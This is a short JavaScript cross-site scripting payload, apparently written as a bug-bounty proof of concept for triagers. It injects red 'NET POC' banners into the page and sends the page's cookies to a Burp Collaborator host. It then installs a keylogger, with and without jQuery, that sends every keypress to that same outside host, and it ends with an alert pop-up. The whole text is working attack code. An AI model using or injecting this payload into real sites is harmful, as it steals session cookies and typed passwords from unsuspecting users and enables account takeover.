// Visual banner for triagers
document.body.innerHTML += "<h1 style='color:red'>[NET POC] External JS Injection</h1>";

// Exfiltrate cookies to Burp Collaborator
fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?cookie=" + encodeURIComponent(document.cookie));

// If jQuery exists, use it for banner + keylogger
if (typeof $ !== "undefined") {
    $("body").prepend("<h2 style='color:black'>KeyLogger</h2>");
    $(document).on("keypress", function(e) {
        fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?key=" + encodeURIComponent(e.key));
    });
} else {
    // Fallback keylogger without jQuery
    document.addEventListener("keypress", function(e) {
        fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?key=" + encodeURIComponent(e.key));
    });
}

// Classic XSS pop-up for undeniable proof
alert("net poc");
